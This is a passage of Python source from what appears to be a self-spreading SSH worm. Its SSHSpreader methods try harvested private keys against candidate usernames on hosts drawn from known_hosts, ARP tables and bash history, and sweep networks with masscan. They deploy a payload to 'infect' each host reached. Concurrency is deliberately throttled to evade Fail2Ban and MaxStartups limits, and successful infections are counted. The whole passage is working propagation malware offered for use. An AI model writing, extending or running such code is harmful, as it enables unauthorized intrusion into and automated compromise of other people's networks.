    # ------------------------------------------------------------------
    # Main spreading coroutines
    # ------------------------------------------------------------------

    async def spread_to_target(self, target_ip, ssh_intel=None):
        """
        Attempt to infect target_ip using the SSH-Snake traversal strategy.

        Every harvested private key is tried against every candidate username.
        An asyncio.Semaphore limits concurrent attempts per host to
        self.per_host_limit, keeping us below MaxStartups / Fail2Ban.
        Already-attempted (ip, port, key, user) tuples are skipped via
        visited_pairs (guarded by asyncio.Lock), preventing infinite loops
        during recursive propagation.

        Returns True immediately on the first successful infection.
        """
        if not ssh_intel:
            return False

        keys      = ssh_intel.get('keys', [])
        hosts     = ssh_intel.get('known_hosts', [])
        usernames = self._get_candidate_usernames(ssh_intel)

        # Resolve port from known_hosts; default to 22
        port = next((h.get('port', 22) for h in hosts if h.get('ip') == target_ip), 22)

        sem = await self._get_host_semaphore(target_ip)

        for key_info in keys:
            key_path = key_info.get('key_path') or key_info.get('path', '')
            for username in usernames:
                pair = (target_ip, port, key_path, username)

                async with self.visited_lock:
                    if pair in self.visited_pairs:
                        continue
                    self.visited_pairs.add(pair)

                async with sem:
                    try:
                        ok, conn = await self.test_ssh_key_async(
                            target_ip, port, username, key_info
                        )
                        if ok and conn:
                            if await self.deploy_via_ssh_async(target_ip, port, conn):
                                self.logger.info(
                                    f'[+] infected  {username}@{target_ip}:{port}  '
                                    f'({os.path.basename(key_path)})'
                                )
                                return True
                    except Exception as exc:
                        print(
                            f'[!] attempt  {username}@{target_ip}:{port}  {exc}'
                        )

        print(
            f'[-] exhausted  {target_ip}:{port}  '
            f'{len(keys)} key(s) x {len(usernames)} user(s)'
        )
        return False

    async def spread_to_all(self, targets, ssh_intel):
        """
        Launch one coroutine per target and await them all concurrently.

        asyncio.gather() schedules every spread_to_target() coroutine into
        the same event loop.  While one coroutine is awaiting a TCP response
        or key-exchange round-trip, every other coroutine makes progress â€”
        all on a single OS thread.  This replaces the ThreadPoolExecutor
        approach with no thread-creation overhead and no GIL contention.

        Returns the number of hosts successfully infected.
        """
        self.logger.info(f'[*] launching {len(targets)} concurrent spread coroutines')
        tasks = [
            self.spread_to_target(t.get('ip') or t, ssh_intel)
            for t in targets
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        count = sum(1 for r in results if r is True)
        self.logger.info(f'[*] spread_to_all complete  infections={count}/{len(targets)}')
        return count

    # ------------------------------------------------------------------
    # Sync entry-point (for callers outside an event loop)
    # ------------------------------------------------------------------

    def run(self, targets, ssh_intel):
        """
        Synchronous entry-point â€” creates an event loop and runs spread_to_all.

        Callers that are already inside an async context should await
        spread_to_all() directly.  This wrapper exists so that the existing
        orchestrator (which calls SSHSpreader from synchronous code) works
        without modification.
        """
        try:
            loop = asyncio.get_event_loop()
            if loop.is_running():
                # Already inside a loop (e.g. called from another coroutine
                # via run_in_executor) â€” schedule as a task instead.
                import concurrent.futures
                future = asyncio.run_coroutine_threadsafe(
                    self.spread_to_all(targets, ssh_intel), loop
                )
                return future.result()
            return loop.run_until_complete(self.spread_to_all(targets, ssh_intel))
        except Exception as exc:
            print(f'[!] run() error  {exc}')
            return 0

    # ------------------------------------------------------------------
    # Discovery (sync â€” uses subprocess)
    # ------------------------------------------------------------------

    def scan_ssh_hosts(self, network_list, ssh_intel=None):
        """
        Build the target list for this spreading round.

        Priority 1  Hosts already known from ssh_intel (known_hosts, ARP,
                    /etc/hosts, bash_history).  Injected directly â€” zero noise.
        Priority 2  masscan sweep of network_list on self.ssh_ports.
                    Only runs when masscan is available on the system.

        Returns a list sorted so intel targets come before scan targets.
        """
        targets = []

        # --- Priority 1: zero-noise injection from harvested intel ---
        if ssh_intel:
            for host in ssh_intel.get('known_hosts', []):
                targets.append({
                    'ip':       host['ip'],
                    'port':     host.get('port', 22),
                    'source':   host.get('source_file', 'known_hosts'),
                    'priority': 'intel',
                })
            self.logger.info(f'[*] {len(targets)} host(s) from harvest intel')

        # --- Priority 2: masscan discovery (supplemental) ---
        if network_list and shutil.which('masscan'):
            port_str = ','.join(str(p) for p in self.ssh_ports)
            for cidr in network_list:
                try:
                    result = subprocess.run(
                        ['masscan', cidr, f'-p{port_str}', '--rate=5000'],
                        capture_output=True, text=True, timeout=300,
                    )
                    for line in result.stdout.splitlines():
                        if '/open' not in line:
                            continue
                        parts = line.split()
                        if len(parts) < 4:
                            continue
                        ip   = parts[3]
                        port = int(parts[2].split('/')[0])
                        if not any(t['ip'] == ip for t in targets):
                            targets.append({
                                'ip': ip, 'port': port,
                                'source': 'masscan', 'priority': 'scan',
                            })
                except subprocess.TimeoutExpired:
                    self.logger.warning(f'[!] masscan timeout  {cidr}')
                except Exception as exc:
                    print(f'[!] masscan error     {cidr}  {exc}')
        elif network_list:
            print('[~] masscan not found — skipping network sweep')

        targets.sort(key=lambda t: t['priority'] != 'intel')
        self.logger.info(f'[*] {len(targets)} total target(s) queued')
        return targets

    def get_stats(self):
        """Return a snapshot of session metrics."""
        total = len(self.successful_targets)
        return {
            'infections':    total,
            'visited_pairs': len(self.visited_pairs),
            'recent':        self.successful_targets[-5:],
        }





